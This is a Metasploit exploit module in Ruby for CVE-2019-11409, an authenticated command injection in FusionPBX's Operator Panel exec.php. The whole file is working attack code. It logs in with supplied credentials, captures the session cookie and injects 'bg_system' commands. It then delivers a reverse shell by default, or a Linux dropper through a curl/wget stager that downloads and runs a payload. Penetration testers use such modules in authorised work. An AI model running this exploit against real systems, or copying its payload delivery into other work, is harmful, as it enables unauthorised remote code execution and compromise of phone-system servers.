# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;FusionPBX Operator Panel exec.php Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits an authenticated command injection vulnerability
        in FusionPBX versions 4.4.3 and prior.

        The `exec.php` file within the Operator Panel permits users with
        `operator_panel_view` permissions, or administrator permissions,
        to execute arbitrary commands as the web server user by sending
        a `system` command to the FreeSWITCH event socket interface.

        This module has been tested successfully on FusionPBX version
        4.4.1 on Ubuntu 19.04 (x64).
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Dustin Cobb&#039;, # Discovery and exploit
          &#039;bcoles&#039;       # Metasploit
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-11409&#039;],
          [&#039;EDB&#039;, &#039;46985&#039;],
          [&#039;URL&#039;, &#039;https://blog.gdssecurity.com/labs/2019/6/7/rce-using-caller-id-multiple-vulnerabilities-in-fusionpbx.html&#039;],
          [&#039;URL&#039;, &#039;https://github.com/fusionpbx/fusionpbx/commit/e43ca27ba2d9c0109a6bf198fe2f8d79f63e0611&#039;]
        ],
      &#039;Platform&#039;        => %w[unix linux],
      &#039;Arch&#039;            => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Payload&#039;         => {&#039;BadChars&#039; => "\x00\x0a\x0d\x27\x5c"},
      &#039;CmdStagerFlavor&#039; => %w[curl wget],
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic (Unix In-Memory)&#039;,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039;},
            &#039;Type&#039;           => :unix_memory
          ],
          [&#039;Automatic (Linux Dropper)&#039;,
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
            &#039;Type&#039;           => :linux_dropper
          ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DefaultOptions&#039;  => { &#039;SSL&#039; => true, &#039;RPORT&#039; => 443 },
      &#039;DisclosureDate&#039;  => &#039;2019-06-06&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to FusionPBX&#039;, &#039;/&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for FusionPBX&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for FusionPBX&#039;])
    ]
  end

  def login(user, pass)
    vprint_status "Authenticating as user &#039;#{user}&#039;"

    vars_post = {
      username: user,
      password: pass,
      path: &#039;&#039;
    }

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;core/user_settings/user_dashboard.php&#039;),
      &#039;vars_post&#039; => vars_post
    })

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    if res.code == 302 && res.headers[&#039;location&#039;].include?(&#039;login.php&#039;)
      fail_with Failure::NoAccess, "Login failed for user &#039;#{user}&#039;"
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
    end

    cookie = res.get_cookies.to_s.scan(/PHPSESSID=(.+?);/).flatten.first

    unless cookie
      fail_with Failure::UnexpectedReply, &#039;Failed to retrieve PHPSESSID cookie&#039;
    end

    print_good "Authenticated as user &#039;#{user}&#039;"

    cookie
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path)
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.body.include?(&#039;FusionPBX&#039;)
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def execute_command(cmd, opts = {})
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;app/operator_panel/exec.php&#039;),
      &#039;cookie&#039;  => "PHPSESSID=#{@cookie}",
      &#039;vars_get&#039; => {&#039;cmd&#039; => "bg_system #{cmd}"}
    }, 5)

    unless res
      return if session_created?
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
    end

    if res.body.include? &#039;access denied&#039;
      fail_with Failure::NoAccess, "User #{datastore[&#039;USERNAME&#039;]} does not have permission to access the Operator Panel"
    end

    res
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
    end

    @cookie = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])

    print_status "Sending payload (#{payload.encoded.length} bytes) ..."

    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(:linemax => 1_500)
    end
  end
end

